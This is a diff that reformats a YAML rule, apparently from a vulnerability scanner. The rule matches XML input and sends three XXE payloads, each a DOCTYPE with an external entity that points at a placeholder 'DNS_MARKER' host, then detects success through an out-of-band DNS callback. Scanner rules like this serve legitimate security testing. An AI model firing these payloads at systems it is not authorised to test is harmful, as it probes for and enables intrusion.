@@ -1,21 +1,18 @@
-collect:
-        - uniq:
-          - [ URI ]
 match:
-        - '.*': '^<' #any data starts with < char
+  - '.*': '^<' # any data starts with < char
 generate:
-        - payload: 
-          - !!str | 
-            <!DOCTYPE x PUBLIC "//xxx/x" "http://DNS_MARKER/x1"><x>x1</x>
-          - !!str | 
-            <!DOCTYPE x SYSTEM "http://DNS_MARKER/x1"><x>x1</x>
-          - !!str |
-            <!DOCTYPE x [ <!ENTITY % y SYSTEM "http://DNS_MARKER/x2">%y;]><x>x2</x>
-        - method: 
-          - replace
+  - payload:
+    - !!str |
+      <!DOCTYPE x PUBLIC "//xxx/x" "http://DNS_MARKER/x1"><x>x1</x>
+    - !!str |
+      <!DOCTYPE x SYSTEM "http://DNS_MARKER/x1"><x>x1</x>
+    - !!str |
+      <!DOCTYPE x [ <!ENTITY % y SYSTEM "http://DNS_MARKER/x2">%y;]><x>x2</x>
+  - method:
+    - replace
 detect:
-        - oob:
-          - dns
+  - oob:
+    - dns
 meta-info:
-        - threat: 80
-        - type: xxe # TODO: WASC, OWASP, CWE references
+  - threat: 80
+  - type: xxe # TODO: WASC, OWASP, CWE references
